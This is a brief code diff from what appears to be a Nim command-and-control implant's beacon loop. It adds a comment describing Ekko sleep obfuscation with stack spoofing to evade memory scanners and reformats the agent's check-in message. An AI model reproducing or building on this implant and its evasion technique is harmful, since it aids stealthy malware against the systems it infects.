@@ -35,10 +35,11 @@ proc main() =
 
     while true: 
 
+        # Sleep obfuscation with stack spoofing to evade memory scanners
         sleepEkko(ctx.sleep * 1000)
 
         let date: string = now().format("dd-MM-yyyy HH:mm:ss")
-        echo fmt"[{date}] Checking in."
+        echo "\n", fmt"[*] [{date}] Checking in."
 
         try: 
             # Retrieve task queue for the current agent by sending a check-in/heartbeat request
